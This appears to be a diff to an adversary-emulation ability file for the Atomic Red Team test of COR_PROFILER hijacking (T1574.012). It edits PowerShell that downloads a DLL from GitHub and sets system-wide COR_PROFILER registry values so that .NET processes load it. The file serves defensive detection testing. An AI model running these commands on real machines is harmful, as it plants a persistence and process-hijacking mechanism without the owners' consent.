@@ -25,11 +25,11 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
-          -OutFile "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"; fi; Write-Host
-          "Creating system environment variables" -ForegroundColor Cyan; New-ItemProperty
-          -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
-          -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null;
-          New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
+          -OutFile "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -UseBasicParsing;
+          fi; Write-Host "Creating system environment variables" -ForegroundColor
+          Cyan; New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
+          Manager\Environment'' -Name "COR_ENABLE_PROFILING" -PropertyType String
+          -Value "1" -Force | Out-Null; New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
           Manager\Environment'' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}"
           -Force | Out-Null; New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
           Manager\Environment'' -Name "COR_PROFILER_PATH" -PropertyType String -Value
@@ -48,9 +48,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - stealth
   - atomic-red-team
   - t1574.012
-  - stealth
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -73,9 +73,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
-        -OutFile "#{file_name}"
+        -OutFile "#{file_name}" -UseBasicParsing
 
         '
     technique_created: '2020-06-24T22:30:55.843Z'
     atomic_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
-    import_timestamp: '2026-10-20T07:08:27.015383Z'
+    import_timestamp: '2026-10-21T07:01:49.732203Z'
